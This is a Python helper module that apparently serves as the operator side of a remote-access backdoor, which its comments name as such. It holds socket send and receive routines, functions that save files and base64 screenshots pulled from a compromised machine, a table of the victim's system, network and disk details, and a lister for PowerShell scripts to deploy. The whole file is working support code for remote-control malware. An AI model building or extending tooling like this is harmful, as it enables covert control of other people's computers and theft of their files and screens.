from termcolor import colored, cprint
import time
import json
import base64
import os
from prettytable import PrettyTable
from PIL import Image
import io





def print_system_info_table(data):
    # Get all the information using the defined functions
    system_info = data[0]
    cpu_info = data[1]
    memory_info = data[2]
    disk_info = data[3]

    # Create PrettyTable objects for each section of the data
    system_table = PrettyTable()
    system_table.field_names = ["System", "Version", "Processor", "IPAddress", "MACAddress"]
    system_table.add_row([
        system_info.get("System", "?"),
        system_info.get("Version", "?"),
        system_info.get("Processor", "?"),
        system_info.get("IPAddress", "?"),
        system_info.get("MACAddress", "?"),
    ])

    cpu_table = PrettyTable()
    cpu_table.field_names = ["PhysicalCores", "TotalCores", "TotalCPUUsage"]
    cpu_table.add_row([
        cpu_info.get("PhysicalCores", "?"),
        cpu_info.get("TotalCores", "?"),
        cpu_info.get("TotalCPUUsage", "?"),
    ])

    memory_table = PrettyTable()
    memory_table.field_names = ["TotalMemoryGB", "TotalAvailableGB", "TotalUsedGB"]
    memory_table.add_row([
        memory_info.get("TotalMemoryGB", "?"),
        memory_info.get("TotalAvailableGB", "?"),
        memory_info.get("TotalUsedGB", "?"),
    ])

    disk_table = PrettyTable()
    disk_table.field_names = ["Partition", "Total", "Used", "Free"]
    for partition, usage_info in disk_info.items():
        disk_table.add_row([partition, usage_info.get("Total", "?"), usage_info.get("Used", "?"), usage_info.get("Free", "?")])

    # Print the PrettyTables
    print("System Information:")
    print(system_table)

    print("\nCPU Information:")
    print(cpu_table)

    print("\nMemory Information:")
    print(memory_table)

    print("\nDisk Information:")
    print(disk_table)


# ------------------------------------------------------------------------------
# Download File From Backdoor
def write_file(path, content):
    try:
        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        # file_path = os.path.join(desktop_path, "test.txt")
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] download successful"
    except Exception as ex:
        print(colored("Error from write_file", "red"))
        print(ex)
        
# ------------------------------------------------------------------------------
# Read file For Upload To Backdoor
def read_file(path):
    try:

        path = os.path.normpath(path)
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    except Exception as ex:
        print(colored("Error from read_file", "red"))
        print(ex)

# ------------------------------------------------------------------------------
def reliable_send(data, s):
    json_data = json.dumps(data)
    json_bytes = json_data.encode()

    # Send the data in chunks to handle larger data
    chunk_size = 1024
    total_bytes_sent = 0
    while total_bytes_sent < len(json_bytes):
        chunk = json_bytes[total_bytes_sent:total_bytes_sent + chunk_size]
        bytes_sent = s.send(chunk)
        if bytes_sent == 0:
            # The socket has been closed, or there was an issue with the connection.
            raise ConnectionError("Socket connection closed or encountered an issue.")
        total_bytes_sent += bytes_sent

# ------------------------------------------------------------------------------
# Receive Data
def reliable_receive(s):
    global TIME_EXECUTION
    start_time = time.time()
    json_data = b""
    while True:
        chunk = s.recv(1024)
        if not chunk:
            # The socket has been closed, or there was an issue with the connection.
            raise ConnectionError(
                "Socket connection closed or encountered an issue.")
        json_data += chunk
        try:
            # Attempt to decode and parse the JSON data
            decoded_data = json.loads(json_data.decode())

            end_time = time.time()
            TIME_EXECUTION = end_time - start_time

            return decoded_data
        except json.JSONDecodeError:
            # JSON decoding failed, continue receiving data
            continue

# ------------------------------------------------------------------------------
def convert_string_to_image_and_save(screenshot_string, file_path):
    try:
        screenshot_bytes = base64.b64decode(screenshot_string.encode())
        screenshot_image = Image.open(io.BytesIO(screenshot_bytes))
        screenshot_image.save(file_path, "PNG")
        return "Image saved successfully"
    except base64.binascii.Error:
        return "Invalid Base64 string. Unable to decode."
    except FileNotFoundError:
        return "File path not found. Please provide a valid file path."
    except Exception as e:
        cprint(f"Failed: {str(e)}", "red")
        return "Image saving failed."

# ------------------------------------------------------------------------------
def create_file_script():
    folder_path = "powerShell"
    files_powerShell_script = {}
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            files_powerShell_script[file_name] = file_path
    return files_powerShell_script

# ------------------------------------------------------------------------------
def showScript():
    files_powerShell_script = create_file_script()
    table = PrettyTable()
    table.field_names = ["File Name", "File Path"]

    for file_name, file_path in files_powerShell_script.items():
        table.add_row([file_name, file_path])
    return table

